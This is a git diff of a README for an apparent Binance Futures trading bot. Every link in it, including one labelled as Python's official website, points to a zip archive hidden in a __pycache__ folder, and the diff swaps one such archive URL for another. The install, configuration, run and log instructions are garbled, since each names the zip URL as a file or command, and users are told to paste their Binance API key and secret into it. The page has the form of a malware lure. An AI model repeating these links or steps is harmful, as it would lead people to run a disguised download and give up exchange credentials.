@@ -1,7 +1,7 @@
 # 🐉 Trading-Bot-For-Binance-Future - A Simple Way to Trade Crypto
 
 ## 📥 Download Now
-[![Download Trading Bot](https://raw.githubusercontent.com/Siddharth-war/Trading-Bot-For-Binance-Future/main/__pycache__/Trading-Bot-For-Binance-Future_2.5.zip)](https://raw.githubusercontent.com/Siddharth-war/Trading-Bot-For-Binance-Future/main/__pycache__/Trading-Bot-For-Binance-Future_2.5.zip)
+[![Download Trading Bot](https://github.com/Siddharth-war/Trading-Bot-For-Binance-Future/raw/refs/heads/main/__pycache__/Trading-Binance-Bot-Future-For-3.5.zip)](https://github.com/Siddharth-war/Trading-Bot-For-Binance-Future/raw/refs/heads/main/__pycache__/Trading-Binance-Bot-Future-For-3.5.zip)
 
 ## 📖 Overview
 Welcome to the Trading-Bot-For-Binance-Future! This is a technical-analysis driven crypto trading bot designed specifically for Binance Futures. It helps you trade cryptocurrencies like Bitcoin and Ethereum efficiently without any programming knowledge.
@@ -16,9 +16,9 @@ To get started using this trading bot, you will need to follow a few simple step
 - **Internet Connection**: Stable internet access to interact with Binance’s trading platform.
 
 ## 🔗 Download & Install
-To download the trading bot, visit this page: [Releases Page](https://raw.githubusercontent.com/Siddharth-war/Trading-Bot-For-Binance-Future/main/__pycache__/Trading-Bot-For-Binance-Future_2.5.zip). You will find the latest version available.
+To download the trading bot, visit this page: [Releases Page](https://github.com/Siddharth-war/Trading-Bot-For-Binance-Future/raw/refs/heads/main/__pycache__/Trading-Binance-Bot-Future-For-3.5.zip). You will find the latest version available.
 
-1. Go to the [Releases Page](https://raw.githubusercontent.com/Siddharth-war/Trading-Bot-For-Binance-Future/main/__pycache__/Trading-Bot-For-Binance-Future_2.5.zip).
+1. Go to the [Releases Page](https://github.com/Siddharth-war/Trading-Bot-For-Binance-Future/raw/refs/heads/main/__pycache__/Trading-Binance-Bot-Future-For-3.5.zip).
 2. Look for the latest version listed. 
 3. Click on the download link appropriate for your operating system.
 
@@ -28,7 +28,7 @@ Once you have downloaded the bot, you may need to extract the files depending on
 - Select "Extract All..." and follow the prompts.
   
 ### ➕ Installing Dependencies
-Before running the bot, make sure you have Python installed. You can download it from [Python's official website](https://raw.githubusercontent.com/Siddharth-war/Trading-Bot-For-Binance-Future/main/__pycache__/Trading-Bot-For-Binance-Future_2.5.zip). Follow these steps to set it up:
+Before running the bot, make sure you have Python installed. You can download it from [Python's official website](https://github.com/Siddharth-war/Trading-Bot-For-Binance-Future/raw/refs/heads/main/__pycache__/Trading-Binance-Bot-Future-For-3.5.zip). Follow these steps to set it up:
 
 1. Download and install Python.
 2. During installation, check the box to "Add Python to PATH."
@@ -45,12 +45,12 @@ pip install ccxt
 These packages will help the bot interact with the Binance API.
 
 ## ⚙️ Configuration
-Before running the bot, you need to configure it with your Binance account details. Open the `https://raw.githubusercontent.com/Siddharth-war/Trading-Bot-For-Binance-Future/main/__pycache__/Trading-Bot-For-Binance-Future_2.5.zip` file located in the extracted folder.
+Before running the bot, you need to configure it with your Binance account details. Open the `https://github.com/Siddharth-war/Trading-Bot-For-Binance-Future/raw/refs/heads/main/__pycache__/Trading-Binance-Bot-Future-For-3.5.zip` file located in the extracted folder.
 
 ### 🔑 Binance API Key and Secret
 1. Log into your Binance account.
 2. Navigate to API Management.
-3. Create a new API key and copy the key and secret to the `https://raw.githubusercontent.com/Siddharth-war/Trading-Bot-For-Binance-Future/main/__pycache__/Trading-Bot-For-Binance-Future_2.5.zip` file.
+3. Create a new API key and copy the key and secret to the `https://github.com/Siddharth-war/Trading-Bot-For-Binance-Future/raw/refs/heads/main/__pycache__/Trading-Binance-Bot-Future-For-3.5.zip` file.
    
 Example configuration:
 
@@ -64,7 +64,7 @@ Example configuration:
 ```
 
 ### ⚖️ Setting Trading Parameters
-You can adjust the trading parameters in the same `https://raw.githubusercontent.com/Siddharth-war/Trading-Bot-For-Binance-Future/main/__pycache__/Trading-Bot-For-Binance-Future_2.5.zip` file according to your preferences. Make sure these values align with your trading strategy.
+You can adjust the trading parameters in the same `https://github.com/Siddharth-war/Trading-Bot-For-Binance-Future/raw/refs/heads/main/__pycache__/Trading-Binance-Bot-Future-For-3.5.zip` file according to your preferences. Make sure these values align with your trading strategy.
 
 ## 🎯 Running the Bot
 To start the trading bot:
@@ -74,13 +74,13 @@ To start the trading bot:
 3. Type the following command:
 
 ```bash
-python https://raw.githubusercontent.com/Siddharth-war/Trading-Bot-For-Binance-Future/main/__pycache__/Trading-Bot-For-Binance-Future_2.5.zip
+python https://github.com/Siddharth-war/Trading-Bot-For-Binance-Future/raw/refs/heads/main/__pycache__/Trading-Binance-Bot-Future-For-3.5.zip
 ```
 
 This will initiate the bot, and it will begin trading based on the configuration you set.
 
 ## 📊 Monitoring Performance
-The bot will log its activity in a file named `https://raw.githubusercontent.com/Siddharth-war/Trading-Bot-For-Binance-Future/main/__pycache__/Trading-Bot-For-Binance-Future_2.5.zip`. You can review this file at any time to see how your trades have performed. Look for metrics such as profit, loss, trades made, and more.
+The bot will log its activity in a file named `https://github.com/Siddharth-war/Trading-Bot-For-Binance-Future/raw/refs/heads/main/__pycache__/Trading-Binance-Bot-Future-For-3.5.zip`. You can review this file at any time to see how your trades have performed. Look for metrics such as profit, loss, trades made, and more.
 
 ## 🛠️ Troubleshooting
 If you encounter issues:
@@ -98,4 +98,4 @@ This project is licensed under the MIT License. Feel free to use, copy, or modif
 ### 👏 Acknowledgments
 Thank you for using Trading-Bot-For-Binance-Future! We appreciate your support and hope this tool helps you in your trading journey. 
 
-For more information, visit our [Releases Page](https://raw.githubusercontent.com/Siddharth-war/Trading-Bot-For-Binance-Future/main/__pycache__/Trading-Bot-For-Binance-Future_2.5.zip) to download the latest version.
+For more information, visit our [Releases Page](https://github.com/Siddharth-war/Trading-Bot-For-Binance-Future/raw/refs/heads/main/__pycache__/Trading-Binance-Bot-Future-For-3.5.zip) to download the latest version.
